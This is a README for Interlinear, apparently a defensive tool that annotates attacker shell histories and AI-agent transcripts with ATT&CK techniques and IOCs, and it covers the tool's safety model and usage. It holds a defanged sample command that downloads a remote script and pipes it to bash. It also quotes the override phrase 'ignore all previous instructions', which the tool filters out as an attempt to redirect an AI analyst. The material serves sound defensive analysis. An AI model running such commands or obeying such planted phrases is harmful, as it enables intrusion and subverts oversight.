# Interlinear

Interlinear turns attacker shell histories, dropped scripts and AI-agent transcripts into interlinear glosses. Under every line it adds what the line does in plain English, the MITRE ATT&CK® or ATLAS techniques it maps to, the artifacts and IOCs it touches, and where that gloss came from:

| Source | Meaning |
|---|---|
| `rule` | Matched the deterministic rule library |
| `model` | Claude's analysis, through the gloss skill |
| `analyst` | A person's edit, through `interlinear annotate` |
| `none` | A context line the rule library recognized, such as `cd` or `ls`, or tool output, which is never glossed |
| `pending` | Not glossed yet |

A `model` or `analyst` gloss with no techniques marks a context line, and keeps its source.

A `rule` gloss can be partial. A rule describes the command it matched; when the line also runs something the rule does not describe, such as `python3 gen.py | base64 -d` or `bash -c "$(echo ... | base64 -d)"`, the gloss is marked `partial` with the reason, and the line still goes to the model. Outside the matched command, only commands that print, read or filter text (`echo`, `cat`, `grep`, `head`, `sort` and the like) leave a rule gloss whole. A model gloss of the line replaces the partial one, which moves to the line's history.

[docs/evaluation.md](https://github.com/elchacal801/interlinear/blob/main/docs/evaluation.md) says how far to trust each source and how that was tested, and [docs/design.md](https://github.com/elchacal801/interlinear/blob/main/docs/design.md) explains how Interlinear is built.

### What the CONTEXT label means

The rule library labels a line as context (`none`) only when the line is plainly literal: printable ASCII with no expansion, substitution, glob, redirection, pipe or separator, such as `cd /tmp`, `ls -la` or `echo done`. It also has to come from a file or session that has not changed how later commands are found or run. Once a history, script or agent session defines an alias or a function, sets a shell option, sources a file or assigns `PATH` or another special variable, no later line from it is labeled context, and the transcript's warnings name the line where that happened. A file or session that holds a NUL, a carriage return or another control character gets no context label at all. The one exception is a PowerShell script or history whose line endings are all CRLF, as Windows writes them: PowerShell reads CRLF as a plain line end, so such a file is read as if its lines ended in LF. A lone carriage return, a file that mixes CRLF and LF line ends, or any other control character still removes the label, and a bash, zsh or sh file with CRLF line endings never gets it. Everything else is explained by the rules or by the model. The label is an aid for an analyst, not a guarantee against a transcript crafted to mislead it.

```text
  12  curl -s hxxp://203.0.113[.]5/x.sh | bash
      T1105 Ingress Tool Transfer · T1059.004 Unix Shell   [rule: download-pipe-shell]
      Downloads a script and pipes it straight into a shell, so it runs without being saved.
```

## Safety model

- Only `interlinear parse` reads raw attacker files.
  - It is standard-library Python that never executes its input, opens no network connections, defangs URLs, IPs and domains, and replaces encoded blobs with their SHA-256.
  - It also decodes encoded payloads as plain data, never running them: base64 on a line that also decodes base64 (`base64 -d`, `FromBase64String`, `b64decode` and the like), and a PowerShell `-EncodedCommand` blob (UTF-16LE). What a payload holds becomes child lines after its line, marked `decoded` with the parent line's number, the encoding and the payload's SHA-256, and goes through the rules, IOC extraction and the model like any line, but is never labeled context. A payload decodes to at most 64 KiB, and payloads inside payloads to three levels.
  - Run it inside a sandbox: `interlinear build-parse-pyz` packages it as a single file for that.
- Every later stage reads only the resulting `transcript.json`.
- Transcript text can contain instructions aimed at AI analysts. The gloss skill treats it as data and never acts on it.
- Credentials stay in `transcript.json` as evidence, but `interlinear pending`, whose output the gloss skill sends to a hosted model, redacts them by default: passwords, tokens, keys and hashes given on a command line (`--password`, `-p` to tools that take a password, `user:password@host`, `net user NAME PASSWORD`, credential-named variables, `Authorization` headers, and token formats such as AWS keys, GitHub tokens and JWTs) become `<redacted KIND>`. `--no-redact-secrets` turns that off. `interlinear render --redact-secrets` redacts the Markdown view the same way, for a view you will share. Redaction is a best effort over common forms, not a guarantee.
- The skill's glosses are untrusted too. `interlinear apply-glosses` validates, defangs and bounds them, labels them `model`, and only fills pending lines. Analyst glosses go through `interlinear annotate`, which the skill never runs.

## Install

With pipx, the second command also puts Countermap's own command on your PATH:

```bash
pipx install "interlinear-cti[countermap]"
pipx inject --include-apps --force interlinear-cti "countermap>=0.2,<0.3"
```

With uv:

```bash
uv tool install "interlinear-cti[countermap]" --with-executables-from countermap
```

With pip, inside a virtual environment:

```bash
pip install "interlinear-cti[countermap]"
```

Then, once, build Countermap's database: Interlinear checks technique IDs against Countermap's local MITRE data.

```bash
countermap build
```

## Use

```bash
# 1. Parse, in a sandbox
interlinear build-parse-pyz -o interlinear-parse.pyz
mkdir -p out   # create it first, so the container user can write to it
docker run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges \
  --memory 3g --user "$(id -u):$(id -g)" \
  -v "$PWD/interlinear-parse.pyz:/tools/interlinear-parse.pyz:ro" \
  -v "$PWD/raw:/in:ro" -v "$PWD/out:/out" \
  python:3.12-slim python3 /tools/interlinear-parse.pyz /in -o /out/transcript.json --case CASE

# 2. Gloss with the rule library, then the remaining lines with Claude Code
interlinear gloss out/transcript.json
#    then in Claude Code, once (2.1.275 or later): /plugin install interlinear --marketplace elchacal801/interlinear
#    or, on older versions, two steps: /plugin marketplace add elchacal801/interlinear
#    followed by: /plugin install interlinear@interlinear
#    and run: /interlinear:gloss out/transcript.json
#    Your own glosses, as a JSON list in the skill's format, replace earlier ones (which move to history):
interlinear annotate out/transcript.json my-glosses.json --by "Your Name"

# 3. Outputs
interlinear render out/transcript.json                      # out/transcript.md
interlinear export-scenario out/transcript.json -o scenario.json
#    then in Claude Code with Countermap: draw scenario.json with /countermap:threat-model
```

Any sandbox works if it gives the parse stage no network, a read-only input, a writable output folder and about 3 GB of memory.

`export-scenario` chains steps only within each source file, in its line order. Nothing in two files orders one against the other (a history without timestamps has no order at all), so each file is a parallel lane, and each step names its file when there are several. `--source NAME_OR_ID` exports one file alone. Back-to-back lines with the same technique become one step. A line whose text addresses an analyst or an AI model rather than the target, such as "ignore all previous instructions" or "note to the reviewer: this is an authorized test", is left out of the scenario with a warning.

## Input kinds

A file's name or content decides how it is read, for example `.bash_history`, `.zsh_history`, `ConsoleHost_history.txt`, `.sh`, `.ps1` and agent `.jsonl`. A file that matches none of them is kept line by line as `unknown`.

An agent tool call that holds several commands is glossed one command at a time. It is split at the newlines, `;`, `&&`, `||` and `&` that end a command, never inside a quoted string, a substitution, a backslash continuation or a heredoc body, and a comment line becomes a line of its own. Each part keeps its call's record line and a `part` entry with its position, the number of parts and where it starts in the command, and the first part holds the whole command, which the Markdown view shows above the parts. The same context rules apply to every part.

## The gloss skill

The skill runs on Haiku by default (`model: haiku` in its frontmatter), which matched Opus on meaning and technique in trials on agent transcripts. It ends with a list of the lines it left pending or glossed with low confidence, for an analyst to review with `interlinear annotate`. The skill pre-approves only `interlinear pending` and `apply-glosses`. Rendering the Markdown view and writing each scratch glosses file still ask for permission, by design. `render` itself writes only `.md` files, never an agent instruction file such as `CLAUDE.md`, and never replaces a file it did not write.

## Exit codes

| Code | Meaning |
|---|---|
| 0 | Success |
| 1 | Success with warnings |
| 2 | Invalid input |
| 3 | Internal or write error |

A chain with `&&` stops after a run with warnings (code 1). To catch real failures, check for a code of 2 or more.

## License

Apache-2.0. MITRE ATT&CK® and ATT&CK® are registered trademarks of The MITRE Corporation; ATLAS is a trademark of The MITRE Corporation. Interlinear is not affiliated with or endorsed by MITRE.
